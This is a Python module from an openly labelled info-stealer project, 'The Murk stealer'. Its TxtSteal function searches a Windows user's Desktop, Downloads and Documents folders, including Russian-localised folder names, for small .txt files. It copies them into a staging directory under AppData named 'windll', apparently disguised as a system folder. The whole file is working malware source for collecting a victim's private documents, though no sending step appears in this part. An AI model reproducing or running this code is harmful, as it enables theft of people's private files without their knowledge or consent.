#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
from os import environ,path,listdir,sep
from shutil import copy


def TxtSteal():
	try:
		pathtofolder = environ['USERPROFILE'] + sep + r'AppData\Local'
		desktop = path.join(path.join(environ['USERPROFILE']), 'Desktop')
		downloads = path.join(path.join(environ['USERPROFILE']), 'Downloads')
		documents = path.join(path.join(environ['USERPROFILE']), 'Documents')
		def fromDesktop():
			listoffiles = listdir(desktop)
			txtfiles = []
			finnalytxtfiles = []
			for i in range(0, len(listoffiles)):
				if listoffiles[i].endswith(".txt"):
					txtfiles.append(listoffiles[i])
			for i in range(0, len(txtfiles)):
				size = path.getsize(desktop+"\\"+txtfiles[i])
				if size < 1000000:
					finnalytxtfiles.append(desktop+"\\"+txtfiles[i])
			for i in range(0, len(finnalytxtfiles)):
				copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\DocumentFiles\Desktop')


		def fromDownloads():
			listoffiles = listdir(downloads)
			txtfiles = []
			finnalytxtfiles = []
			for i in range(0, len(listoffiles)):
			    if listoffiles[i].endswith(".txt"):
			        txtfiles.append(listoffiles[i])
			for i in range(0, len(txtfiles)):
			    size = path.getsize(downloads+"\\"+txtfiles[i])
			    if size < 1000000:
			        finnalytxtfiles.append(downloads+"\\"+txtfiles[i])
			for i in range(0, len(finnalytxtfiles)):
			    copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\DocumentFiles\Downloads')

		def fromDocuments():
			listoffiles = listdir(documents)
			txtfiles = []
			finnalytxtfiles = []
			for i in range(0, len(listoffiles)):
			    if listoffiles[i].endswith(".txt"):
			        txtfiles.append(listoffiles[i])
			for i in range(0, len(txtfiles)):
			    size = path.getsize(documents+"\\"+txtfiles[i])
			    if size < 1000000:
			        finnalytxtfiles.append(documents+"\\"+txtfiles[i])
			for i in range(0, len(finnalytxtfiles)):
			    copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\DocumentFiles\Documents')
		
		fromDesktop()
		fromDownloads()
		fromDocuments()

	except Exception as e:
		print(e)


	try:
		desktop = path.join(path.join(environ['USERPROFILE']), 'Рабочий стол')
		downloads = path.join(path.join(environ['USERPROFILE']), 'Загрузки')
		documents = path.join(path.join(environ['USERPROFILE']), 'Документы')
		def fromDesktop():
			listoffiles = listdir(desktop)
			txtfiles = []
			finnalytxtfiles = []
			for i in range(0, len(listoffiles)):
				if listoffiles[i].endswith(".txt"):
					txtfiles.append(listoffiles[i])
			for i in range(0, len(txtfiles)):
				size = path.getsize(desktop+"\\"+txtfiles[i])
				if size < 1000000:
					finnalytxtfiles.append(desktop+"\\"+txtfiles[i])
			for i in range(0, len(finnalytxtfiles)):
				copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\DocumentFiles\Desktop')


		def fromDownloads():
			listoffiles = listdir(downloads)
			txtfiles = []
			finnalytxtfiles = []
			for i in range(0, len(listoffiles)):
			    if listoffiles[i].endswith(".txt"):
			        txtfiles.append(listoffiles[i])
			for i in range(0, len(txtfiles)):
			    size = path.getsize(downloads+"\\"+txtfiles[i])
			    if size < 1000000:
			        finnalytxtfiles.append(downloads+"\\"+txtfiles[i])
			for i in range(0, len(finnalytxtfiles)):
			    copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\DocumentFiles\Downloads')

		def fromDocuments():
			listoffiles = listdir(documents)
			txtfiles = []
			finnalytxtfiles = []
			for i in range(0, len(listoffiles)):
			    if listoffiles[i].endswith(".txt"):
			        txtfiles.append(listoffiles[i])
			for i in range(0, len(txtfiles)):
			    size = path.getsize(documents+"\\"+txtfiles[i])
			    if size < 1000000:
			        finnalytxtfiles.append(documents+"\\"+txtfiles[i])
			for i in range(0, len(finnalytxtfiles)):
			    copy(finnalytxtfiles[i], rf'{pathtofolder}\windll\DocumentFiles\Documents')
		
		fromDesktop()
		fromDownloads()
		fromDocuments()

	except Exception as e:
		print(e)

